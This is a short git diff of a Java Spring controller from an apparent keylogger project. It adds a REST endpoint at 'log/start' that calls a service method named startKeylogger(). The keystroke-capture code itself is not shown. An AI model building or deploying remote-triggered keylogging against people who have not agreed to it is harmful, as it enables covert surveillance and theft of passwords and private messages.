@@ -1,7 +1,21 @@
 package com.badar.keylogger.Controllers;
 
-import org.springframework.stereotype.Controller;
+import com.badar.keylogger.Services.GlobalKeyListenerService;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RestController;
 
-@Controller
+
+@RestController
+@RequestMapping("log")
 public class GlobalKeyListenerController {
+
+    @Autowired
+    private GlobalKeyListenerService globalKeyListenerService;
+
+    @GetMapping("start")
+    public void getGlobalKeyListenerService() {
+        globalKeyListenerService.startKeylogger();
+    }
 }
